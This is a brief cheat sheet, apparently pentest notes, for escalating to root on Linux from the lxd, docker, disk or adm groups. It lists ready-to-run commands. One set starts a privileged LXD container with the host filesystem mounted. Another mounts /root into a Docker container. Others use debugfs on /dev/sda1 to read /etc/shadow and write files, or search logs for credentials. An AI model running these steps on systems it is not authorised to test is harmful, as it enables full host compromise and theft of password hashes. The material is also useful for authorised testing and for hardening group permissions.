```
LXC and LXD:
# build a simple alpine image 
git clone https://github.com/saghul/lxd-alpine-builder 
cd lxd-alpine-builder 
./build-alpine -a i686 

# import the image 
lxc image import ./alpine.tar.gz --alias myimage 

# run the image 
lxc init myimage mycontainer -c security.privileged=true 

# mount the /root into the image 
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true 

# interact with the container 
lxc start mycontainer 
lxc exec mycontainer /bin/sh

Docker:
docker run -v /root:/mnt -it ubuntu
Browse to mounted directory
Go to this website for more info:
[chrisfosterelli/rootplease - Docker Image | Docker Hub](https://hub.docker.com/r/chrisfosterelli/rootplease/)

Disk:
If we have full access to /dev sush as /dev/sda1 we can use debugfs to access the entire filesystem
debugfs /dev/sda1
debugfs: cat /etc/shadow

or write files
debugfs -w /dev/sda1 
debugfs: dump /tmp/asd1.txt /tmp/asd2.txt

ADM and secaudit:
Look vor creds in /var/log

```